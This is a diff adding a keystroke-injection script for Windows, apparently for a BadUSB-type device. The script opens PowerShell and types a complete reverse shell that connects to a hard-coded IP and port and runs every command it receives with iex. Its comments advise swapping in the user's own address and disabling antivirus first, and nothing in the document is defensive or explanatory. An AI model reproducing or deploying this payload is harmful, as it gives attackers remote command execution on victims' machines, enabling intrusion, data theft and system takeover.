@@ -1,0 +1,16 @@
+Rem:WINDOWS
+Rem:Runs a reverse shell to a specified server
+Rem:Don't forget to replace with your ip/port
+Rem:Note that it's best if the AV is disabled first
+Rem:-----
+Press:131+114
+CustomDelay:10
+Print:powershell.exe
+CustomDelay:100
+Press:176
+CustomDelay:500
+Print:$client = New-Object System.Net.Sockets.TCPClient("37.187.39.178",8989);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+CustomDelay:2500
+Press:176
+CustomDelay:10
+Press:131+100
